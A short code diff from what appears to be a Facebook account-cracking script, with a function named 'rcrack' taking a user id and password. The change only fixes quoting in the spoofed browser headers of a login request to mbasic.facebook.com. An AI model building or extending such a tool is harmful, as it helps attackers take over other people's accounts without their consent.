@@ -309,9 +309,9 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-	        'method':'GET',
-	        'path':'/login/?li=vFUUZIfK7yURwnGICQ66awAx&e=1348029&shbl=1&refsrc=deprecated&rtime=1679054271&subno_key=AaGhAvqVFUOHYSn_1_v3j01QAzIEQPcMUdj5ww4aFTIj1SLriRtyX3h9Xk19MTY0GfMQmU42cv_WXvS3yZVVxuCnmcqe4jgzXtey42BoYpmQ3kXhsbhnRZ1lLNXfJx999m318Rrhym5ttCv2iKVurJLE6xIvXjd9AwBgFCiLbvqejMPrqItkQrOHaVH6t9Sg2KUKBwnYaZq1Ian3_19OSaQP7CvUzP73ehKXmJYh6JYbmTSb_VByrn7zsssck9LeAP67YOvKhtKOJT-Vz0evqqsgUJuPifdSYeHcNXkYx7g7odfTwRANYdJft6FldjmkHTo&hrc=1&_rdr',
-  	        'scheme": 'https',
+	        'method': 'GET',
+	        'path': '/login/?li=vFUUZIfK7yURwnGICQ66awAx&e=1348029&shbl=1&refsrc=deprecated&rtime=1679054271&subno_key=AaGhAvqVFUOHYSn_1_v3j01QAzIEQPcMUdj5ww4aFTIj1SLriRtyX3h9Xk19MTY0GfMQmU42cv_WXvS3yZVVxuCnmcqe4jgzXtey42BoYpmQ3kXhsbhnRZ1lLNXfJx999m318Rrhym5ttCv2iKVurJLE6xIvXjd9AwBgFCiLbvqejMPrqItkQrOHaVH6t9Sg2KUKBwnYaZq1Ian3_19OSaQP7CvUzP73ehKXmJYh6JYbmTSb_VByrn7zsssck9LeAP67YOvKhtKOJT-Vz0evqqsgUJuPifdSYeHcNXkYx7g7odfTwRANYdJft6FldjmkHTo&hrc=1&_rdr',
+  	        'scheme': 'https',
   	        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
   	        'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
   	        'cache-control': 'max-age=0',
